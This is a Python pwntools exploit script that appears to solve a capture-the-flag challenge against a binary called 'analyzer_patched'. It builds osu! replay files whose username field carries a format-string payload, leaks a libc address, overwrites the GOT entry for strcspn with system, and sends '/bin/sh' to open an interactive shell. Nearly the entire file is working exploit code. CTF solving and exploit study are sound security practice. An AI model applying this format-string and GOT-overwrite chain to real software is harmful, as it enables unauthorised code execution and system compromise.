#!/usr/bin/env python3
from pwn import *
from osrparse import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './analyzer_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.osugaming.lol', 7273

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

def craftPayload(payload):
    replay = Replay.from_path('sample.osr')
    replay.username = payload.decode()
    replay.write_path('payload.osr')

    # Read the binary contents of the payload file
    with open('payload.osr', 'rb') as file:
        binary_data = file.read()
    
    hex = binascii.hexlify(binary_data)

    return hex

# =========================================================
#                         EXPLOITS
# =========================================================
# xxd -p -c0 <FILE>
# 1 byte osu mode
# unused 10
# 255 bytes hash (fmt vuln)
# 255 bytes name (fmt vuln)
# read another 255 bytes
# unused 10
# 2 bytes miss count

def exploit():
    global io
    io = initialize()

    # payload = craftPayload(b'AAAAAAAA||%14$p')
    payload = craftPayload(b'%3$p')
    io.sendlineafter(b':', payload)

    io.recvuntil(b'name: ')
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - 0x114887

    fmt = fmtstr_payload(14, {elf.got['strcspn']: libc.sym['system']})
    payload = craftPayload(fmt)
    io.sendlineafter(b':', payload)

    io.sendlineafter(b':', b'/bin/sh')

    info('leak: %#x', leak)
    info('libc base: %#x', libc.address)
    info('libc system: %#x', libc.sym['system'])
    info('got strcspn: %#x', elf.got['strcspn'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()